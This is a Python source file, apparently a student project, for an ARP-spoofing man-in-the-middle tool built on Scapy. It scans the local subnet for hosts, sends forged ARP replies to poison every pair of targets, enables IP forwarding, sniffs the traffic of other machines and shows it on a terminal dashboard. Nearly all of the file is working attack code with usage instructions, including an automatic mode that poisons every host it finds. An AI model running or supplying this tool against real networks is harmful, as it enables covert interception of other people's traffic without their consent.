from scapy.all import *
import socket
from multiprocessing import Process
from multiprocessing.connection import Listener, Client # pour échanger des données entre les processus
from threading import Thread

# Richard et Corentin
localhost = "127.0.0.1"
subnet = None
myip = socket.gethostbyname(socket.gethostname())

class SmartAnalyzer:
    def __init__(self, key="secret"):
        self.capture = None
        self.workingBuffer = {"pakets": []}
        self.IPAddr = myip
        self.timer = time.time()
        self.key = key
        self.data = {}
        self.total_bandwith = {}


    def start(self, interface):
        self.capture = AsyncSniffer(iface=interface, prn=self.add)
        self.capture.start()
        while True:
            try:
                time.sleep(1)

                for i in range(len(self.workingBuffer["pakets"])):
                    if time.time() - self.workingBuffer["pakets"][i].time > 5:
                        del self.workingBuffer["pakets"][i]
                        break
                self.analyze()

                if len(self.data) != 0:
                    self.send_data(self.data)
                    self.data = {}
            except KeyboardInterrupt:
                break

        try:
            self.capture.join()
        except KeyboardInterrupt:
            self.capture.stop()
        print("stopped analyzer")

    def add(self,pkt):
        if pkt.haslayer(IP):
            if pkt[IP].src != self.IPAddr and pkt[IP].dst != self.IPAddr:
                self.workingBuffer["pakets"].append(pkt)
        else:
            pass

    def analyze(self):
        ip_map = {}
        for pkt in self.workingBuffer["pakets"]:
            if pkt[IP].dst not in ip_map:
                ip_map[pkt[IP].dst] = []
            if pkt[IP].src not in ip_map[pkt[IP].dst]:
                ip_map[pkt[IP].dst].append(pkt[IP].src)

        suspicious_ips = []
        other_ips = []

        for ip in ip_map:
            if len(ip_map[ip]) > 1:
                suspicious_ips.append(ip)
            else:
                other_ips.append(ip)

        data = {}
        data["analysis"] = {}

        for ip in suspicious_ips:
            if self.is_private(ip):
                data["analysis"][ip] = {"type": "Private","Suspicious": True, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": "none"}
            else:
                try:
                    data["analysis"][ip] = {"type": "Public", "Suspicious": True, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": socket.gethostbyaddr(ip)[0]}
                except Exception:
                    data["analysis"][ip] = {"type": "Public", "Suspicious": True, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": "Unknown"}

        for ip in other_ips:
            if self.is_private(ip):
                data["analysis"][ip] = {"type": "Private", "Suspicious": False, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": "none"}
            else:
                try: # we do a reverse dns lookup to see if it is a known site using
                    data["analysis"][ip] = {"type": "Public", "Suspicious": False, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": socket.gethostbyaddr(ip)[0]}
                except Exception:
                    data["analysis"][ip] = {"type": "Public", "Suspicious": False, "hosts": ip_map[ip], "count": len(ip_map[ip]), "name": "Unknown"}

        # we have to count how many different ip acessed each dest ip
        for ip in data["analysis"]:
            hosts = []
            for host in data["analysis"][ip]["hosts"]:
                if host not in hosts:
                    hosts.append(host)
            data["analysis"][ip]["hcount"] = len(hosts)



        for pkt in self.workingBuffer["pakets"]:
            if pkt[IP].src != self.IPAddr and pkt[IP].dst != self.IPAddr:
                if self.is_private(pkt[IP].src):
                    if pkt[IP].src not in self.total_bandwith:
                        self.total_bandwith[pkt[IP].src] = pkt.len/1000
                    else:
                        self.total_bandwith[pkt[IP].src] += pkt.len/1000
                elif self.is_private(pkt[IP].dst):
                    if pkt[IP].dst not in self.total_bandwith:
                        self.total_bandwith[pkt[IP].dst] = pkt.len/1000
                    else:
                        self.total_bandwith[pkt[IP].dst] += pkt.len/1000

        self.workingBuffer["pakets"] = []

        # we have to calculate the total bandwith for each ip
        #for ip in self.total_bandwith:
        #    self.total_bandwith[ip] = str(self.total_bandwith[ip]) + " kilobytes"


        self.data = data

    def send_data(self, data):
        while True:
            try:
                conn = Client(address=(localhost, 9658), authkey=b'secret')

                conn.send({"type": "analyzer", "data": data["analysis"]})
                conn.send({"type": "total bandwidth", "data": self.total_bandwith})

                conn.close()

                break
            except :
                time.sleep(0.1)




    def get_status(self, hostname):
        if hostname == "Unknown":
            return "Unknown"

        elif hostname == "Private IP":
            return "Private IP"

        elif hostname == self.IPAddr:
            return "Your IP"

        else:
            return "---"



    def is_private(self, ip):
        # we check if it is a private ip
        ip = ip.split(".")
        if ip[0] == "10":
            return True

        elif ip[0] == "172":
            if 16 <= int(ip[1]) <= 31:
                return True

        elif ip[0] == "192" and ip[1] == "168":
            return True
        return False




class Drawer:  # this class will be used to draw everything in the terminal in a clean way
    def __init__(self):
        self.width = os.get_terminal_size().columns
        self.height = os.get_terminal_size().lines

        self.data = {"analyzer": {}, "mitm": {}, "total bandwith": {}} # we will store the data in this dictionary

        self.drawerT = Thread(target=self.drawer)

    def drawer(self):
        drawtimer = time.time()
        oldwidth = self.width
        oldheight = self.height

        while True:
            self.width = os.get_terminal_size().columns
            self.height = os.get_terminal_size().lines

            if self.width != oldwidth or self.height != oldheight:
                self.draw()
                oldwidth = self.width
                oldheight = self.height

            if time.time() - drawtimer > 1:
                self.draw()
                drawtimer = time.time()

            time.sleep(0.001)
    def main_loop(self):
        listener = Listener(address=(localhost, 9658), authkey=b'secret')

        print("listening for connections")
        self.drawerT.start()

        while True:
            conn = listener.accept()

            while True:
                try:
                    while conn.poll():
                        recv = conn.recv()

                        if recv is not None:

                            try:
                                match recv["type"]:

                                    case "analyzer":
                                        print("received data from analyzer")
                                        self.data["analyzer"] = recv["data"]
                                    case "total bandwidth":
                                        print("received bandwidth from analyzer")
                                        self.data["total bandwidth"] = recv["data"]
                                    case "mitm":
                                        print("received data from mitm")
                                        self.data["mitm"] = recv["data"]
                                    case _:
                                        print("got unknown data")

                            except Exception:
                                print("error while parsing data")

                except EOFError:
                    break
            time.sleep(0.5)
    def draw_interface(self):
        # we draw the table with the data
        self.draw_table(self.data)

    def draw_table(self, data):
        if len(data["mitm"]) == 0 and len(data["analyzer"]) == 0:
            print("No data to display")
            return

        if len(data["total bandwith"]) == 0:
            data["total bandwith"] = {"No data to display": "No data to display"}

        imagebuffer = []

        imagebuffer.append("+" + "=" * (self.width - 2) + "+")
        imagebuffer.append("|" + "targets" + " " * (self.width - len("targets") - 3) + "|")
        imagebuffer.append("+" + "-" * (self.width - 2) + "+")

        iplenght = 0
        for i in data["mitm"]:
            if len(i[0]) > iplenght:
                iplenght = len(i)

        # do not forget the title
        if len("IP Address") > iplenght:
            iplenght = len("IP Address")

        macaddrlenght = 0
        for i in data["mitm"]:
            if i[1] is None:
                iplenght = 4

            elif len(i[1]) > iplenght:
                iplenght = len(i)

        if len("MAC Address") > macaddrlenght:
            macaddrlenght = len("MAC Address")

        statuslenght = 0
        for i in data["total bandwith"]:
            if len(str(i)) > statuslenght:
                statuslenght = len(str(i))

        if len("Data amount") > statuslenght:
            statuslenght = len("Data amount (kb)")

        totallenght = iplenght + macaddrlenght + statuslenght + 3

        spaces = self.width - 2 - totallenght
        # we add the spaces
        iplenght += spaces // 4
        macaddrlenght += spaces // 4
        statuslenght += spaces // 4

        # we draw the table header but we have to calculate the number of spaces to add to respect each collumn lengh defined before
        ipspace = iplenght - len("IP Address")
        macaddrspace = macaddrlenght - len("MAC Address")
        dataspace = statuslenght - len("Data amount (kb)")

        # we add the spaces
        imagebuffer.append("|" + "IP Address" + " " * ipspace + "|" + "MAC Address" + " " * macaddrspace + "|" + "Data amount (kb)" + " " * dataspace + "|")
        imagebuffer.append("+" + "-" * (self.width - 2) + "+")


        # we draw the table content
        for ip in data["mitm"]:
            try:
                if ip[0] in data["total bandwidth"]:
                    total_bandwith = str(data["total bandwidth"][str(ip[0])])

                else:
                    total_bandwith = "?"

                ipspace = iplenght - len(ip[0])
                macaddrspace = macaddrlenght - len(ip[1])
                dataspace = statuslenght - len(total_bandwith)

                # we add the spaces

                imagebuffer.append("|" + ip[0] + " " * ipspace + "|" + ip[1] + " " * macaddrspace + "|" + total_bandwith + " " * dataspace + "|")

            except Exception as e:
                imagebuffer.append(e)

        imagebuffer.append("+" + "=" * (self.width - 2) + "+")
        #imagebuffer.append(" " * (self.width - 2))
        imagebuffer.append("\n")
        imagebuffer.append("+" + "=" * (self.width - 2) + "+")


        # we draw the analyzer table

        # we draw the title
        imagebuffer.append("|" + "analyzer" + " " * (self.width - len("analyzer") - 3) + "|")
        imagebuffer.append("+" + "-" * (self.width - 2) + "+")


        # we prepare all the collumn lengh for the next step
        iplenght = 0
        for i in data["analyzer"]:
            if len(i) > iplenght:
                iplenght = len(i)
        # do not forget the title
        if len("Dest ip") > iplenght:
            iplenght = len("Dest ip")

        hostnamelenght = 0
        for i in data["analyzer"]:
            if len(data["analyzer"][i]["name"]) > hostnamelenght: #
                hostnamelenght = len(data["analyzer"][i]["name"])

        if len("hostname") > hostnamelenght:
            hostnamelenght = len("hostname")

        requestslenght = 0
        for i in data["analyzer"]:
            if len(str(data["analyzer"][i]["count"])) > requestslenght:
                requestslenght = len(str(data["analyzer"][i]["count"]))

        if len("nb of requests(total)") > requestslenght:
            requestslenght = len("nb of requests(total)")

        hostscountlenght = 0
        for i in data["analyzer"]:
            if len(str(data["analyzer"][i]["hcount"])) > hostscountlenght:
                hostscountlenght = len(str(data["analyzer"][i]["hcount"]))

        if len("nb of host that accessed it") > hostscountlenght:
            hostscountlenght = len("nb of host that accessed it")

        totallenght = iplenght + hostnamelenght + requestslenght + hostscountlenght + 3
        spaces = self.width - 2 - totallenght
        # we add the spaces
        iplenght += spaces // 4
        hostnamelenght += spaces // 4
        requestslenght += spaces // 4
        hostscountlenght += spaces // 4

        ipspace = iplenght - len("Dest ip")
        hostnamespace = hostnamelenght - len("hostname")
        requestsspace = requestslenght - len("nb of requests(total)")
        hostscountspace = hostscountlenght - len("nb of host that accessed it")
        # we add the spaces
        imagebuffer.append("|" + "Dest ip" + " " * ipspace + "|" + "hostname" + " " * hostnamespace + "|" + "nb of requests(total)" + " " * requestsspace + "|" + "nb of host that accessed it" + " " * hostscountspace + "|")
        imagebuffer.append("+" + "-" * (self.width - 2) + "+")


        # we draw the table content
        for ip in data["analyzer"]:
            try:
                # we just have to calculate the number of spaces to add to respect each collumn lengh defined before
                ipspace = iplenght - len(ip)
                hostnamespace = hostnamelenght - len(data["analyzer"][ip]["name"])
                requestsspace = requestslenght - len(str(data["analyzer"][ip]["count"]))
                hostscountspace = hostscountlenght - len(str(data["analyzer"][ip]["hcount"]))
                # we add the spaces
                imagebuffer.append("|" + ip + " " * ipspace + "|" + data["analyzer"][ip]["name"] + " " * hostnamespace + "|" + str(data["analyzer"][ip]["count"]) + " " * requestsspace + "|" + str(data["analyzer"][ip]["hcount"]) + " " * hostscountspace + "|")
                imagebuffer.append(data["analyzer"][ip]["hosts"])

            except Exception:
                imagebuffer.append("error")

        imagebuffer.append("+" + "=" * (self.width - 2) + "+")

        # we print the image buffer
        os.system("clear")
        for i in imagebuffer:
            print(i)

    def draw(self):
        # we draw everything
        self.draw_interface()

class Netscanner:
    def __init__(self, interface):
        self.interface = interface
        self.IPAddr = myip
        # get subnet mask using ip a on linux
        self.subnet = subnet
        # get network address using subnet and host ip
        self.scanip = self.IPAddr[:self.IPAddr.rfind(".")] + ".1/" + self.subnet
        self.ips = []

    def sniffer_arp(self):
        print("[*] Starting scan...")
        arp = ARP(pdst=self.scanip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        # stack them
        packet = ether / arp

        result = srp(packet, timeout=3, verbose=0)[0]

        # a list of clients, we will fill this in the upcoming loop
        clients = []

        for sent, received in result:
            # for each response, append ip and mac address to `clients` list
            ip = received.psrc
            if ip != self.IPAddr:
                self.ips.append(received.psrc)



    def get_ips(self):
        self.sniffer_arp()
        return self.ips


class MITMAttack:

    def __init__(self, interface, target_ips):
        self.interface = interface
        self.tips = target_ips
        self.scannerT = None
        self.drawP = None
        self.targets = []
        # my mac address
        self.mac_addr = os.popen("ip a | grep " + self.interface + " | grep ether | awk '{print $2}'").read().split("\n")[0]
        # my ip address
        self.IPAddr = socket.gethostbyname(socket.gethostname())


    def scanner(self):

        scanner = Netscanner(self.interface)
        while True:
            ips = scanner.get_ips()
            iplist = []
            for i in self.targets:
                iplist.append(i[0])

            for ip in ips:

                if len(iplist) == 0:
                    self.targets.append([ip, None])
                    iplist.append(ip)
                else:
                    if ip not in iplist:
                        iplist.append(ip)
                        self.targets.append([ip, self.get_mac(ip)])


            for i in self.targets:
                if i[1] is None: # if not, we try to get it
                    self.targets[self.targets.index(i)][1] = self.get_mac(i[0])
                    # if we still can't get it, we remove it from the list
                    if self.targets[self.targets.index(i)][1] is None:
                        self.targets.remove(i)


            if len(self.targets) != 0:
                datalist = []
                # we have to put each ip with each mac
                self.send_data(self.targets)

            time.sleep(5)

    def send_data(self, data):
        while True:
            try:
                conn = Client(address=(localhost, 9658), authkey=b'secret')
                conn.send({"type": "mitm", "data": data})
                conn.close()
                break
            except :
                time.sleep(0.1)

    def enable_ip_forwarding(self):
        print("\n[*] Enabling IP Forwarding...\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def get_mac(self, IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=self.interface, inter=0.1)
        for snd, rcv in ans:
            return rcv.sprintf(r"%Ether.src%")

    def reARP(self):
        print("\n[*] Restoring Targets...")
        # we have to restaure each victim to its original state the same way we tricked them

        for i in self.targets:
            for j in self.targets:
                if i != j:
                    send(ARP(op=2, pdst=i[0], psrc=j[0], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=j[1]), count=7)
                    send(ARP(op=2, pdst=j[0], psrc=i[0], hwdst="ff:ff:ff:ff:ff:ff", hwsrc=i[1]), count=7)

        print("\n[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


        print("[*] Shutting Down...")
        os.system("killall python")
        os.system("killall python3")
        sys.exit(1)

    def trick(self):
        if len(self.targets) != 0:
            for i in self.targets:
                if i != self.IPAddr:
                    for j in self.targets:
                        if j != self.IPAddr:
                            if i != j:
                                send(ARP(op=2, pdst=i[0], psrc=j[0], hwdst=i[1]))
                                time.sleep(0.02)
                                send(ARP(op=2, pdst=j[0], psrc=i[0], hwdst=j[1]))
                                time.sleep(0.02)


    def mitm(self,mode):
        try:
            if self.tips is not None:
                for i in self.tips:
                    self.targets.append((i, self.get_mac(i)))
        except Exception:
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("[!] Couldn't Find MAC Address(es)")
            print("[!] Exiting...")
            sys.exit(1)
        if mode == "auto":
            print("[*] Starting scanner thread...")
            self.scannerT = Thread(target=self.scanner)
            self.scannerT.start()

        print("[*] Starting drawer thread...")
        self.drawP = Process(target=Drawer().main_loop)
        self.drawP.start()


        timer = time.time()

        print("[*] Poisoning Targets...")
        print("[*] Use CTRL+C to stop")
        print("[*] Targets poisoned: ")
        while True:
            try:
                try :
                    self.trick()
                except Exception:
                    print("error while poisoning")
                time.sleep(1.5)

            except KeyboardInterrupt:
                self.reARP()
                break

def print_usage():
    print('Usage: python main.py -i <interface> -t "<target_ip1> <target_ip2> ..."')
    print('Example for "smart automatic" mode:  python main.py -i {your interface} -s')
    print(' ')
    print('-s : enable packet analyser (include data amount)')
    print('-a : specify your ip address (if something doesnt work)')
    print('-i : specify interface')
    print('-t : specify target ip(s), if not specified, automatic mode will be used')

def main(argv):
    smart = None
    slave = False

    interface = None
    target_ips = []
    for i in range(len(argv)):
        if argv[i] == "-i":
            interface = argv[i + 1]
            global subnet


            subnet = os.popen("ip a | grep " + interface + " | grep inet | awk '{print $2}'").read().split("/")[1][:-1]
        elif argv[i] == "-t":
            target_ips = argv[i + 1].split(" ")
        elif argv[i] == "-a":
            global myip
            myip = argv[i + 1]
        elif argv[i] == "-s":
            # smart mode
            smart = Process(target=SmartAnalyzer().start, args=(interface,))

    mode = "manual"
    if interface is None:
        print("Interface not specified")
        print_usage()
        sys.exit(1)
    elif len(target_ips) == 0:
        print("Target IPs not specified using auto mode")
        print_usage()
        mode = "auto"


    print(f"Interface: {interface}")
    print(f"Target IPs: {target_ips}")
    attack = MITMAttack(interface, target_ips)
    attack.enable_ip_forwarding()
    if smart is not None:
        smart.start()

    attack.mitm(mode)

if __name__ == "__main__":
    #attack = MITMAttack()
    #attack.enable_ip_forwarding()
    #attack.mitm()
    main(sys.argv[1:])
